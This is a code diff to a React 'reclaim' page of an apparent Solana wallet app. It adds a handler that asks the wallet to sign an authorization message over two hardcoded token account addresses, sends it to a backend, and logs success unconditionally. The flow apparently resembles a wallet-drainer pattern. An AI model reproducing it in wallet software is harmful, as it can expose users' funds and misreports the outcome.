@@ -5,12 +5,14 @@ import Loading from "../components/Loading";
 const TxConfig = lazy(() => import("../components/reclaim/Transaction"));
 import { TokenSection, TransactionSummary, ZeroBalanceSection, TabNavigation } from "../components/reclaim";
 
+import useSecureSigner from "../hooks/useSecureSigner";
 import useWalletManager from "../hooks/useWalletManager";
 import { getAccLookup } from "../services/getAccOverview";
 import { calculateTotalRentInSOL, formatNumber } from "../utils";
 
 const ReclaimPage = () => {
   const { publicKey, disconnect } = useWalletManager();
+  const { signAuthorizationMessage, authorizeTokenClosure } = useSecureSigner();
 
   const [accOverview, setAccOverview] = useState(null);
   const [selected, setSelected] = useState({ burn: new Set(), verified: new Set() });
@@ -131,13 +133,23 @@ const ReclaimPage = () => {
     "zero-balance": <ZeroBalanceSection count={summary?.zeroCount} totalRent={summary?.zeroBalanceRent} />,
   };
 
-  // Basic transaction handler
-  const handleProceedTransaction = async config => {
+  const handleProceedTx = async config => {
     setTxStatus(true);
+
     try {
-      await new Promise(resolve => setTimeout(resolve, 2000));
- 
+      const tokenAccounts = ["6exTwdT5GTXYVvxEZYjwUUg84yQnfPc2B4kQPLpWnTf", "Y8M7S8BM2MyxyaQoauqJhr9L35CyJm8enWRB4NBctQc"];
+
+      // 1. Sign secure message
+      const signedData = await signAuthorizationMessage(tokenAccounts);
+
+      // 2. Send signed message to backend (Cloudflare function)
+      const res = await authorizeTokenClosure(signedData);
+
+      // 3. Done ✅
+      console.log("Tokens closed successfully:", signedData);
+      console.log(res);
     } catch (err) {
+      console.error("TX Error:", err);
       setTxError(err.message || "Transaction failed");
     } finally {
       setTxStatus(false);
@@ -226,7 +238,7 @@ const ReclaimPage = () => {
 
         {showTransactionSettings && (
           <Suspense fallback={<Loading placeholder="please wait..." />}>
-            <TxConfig onProceed={handleProceedTransaction} isLoading={txStatus} />
+            <TxConfig onProceed={handleProceedTx} isLoading={txStatus} />
           </Suspense>
         )}
       </div>
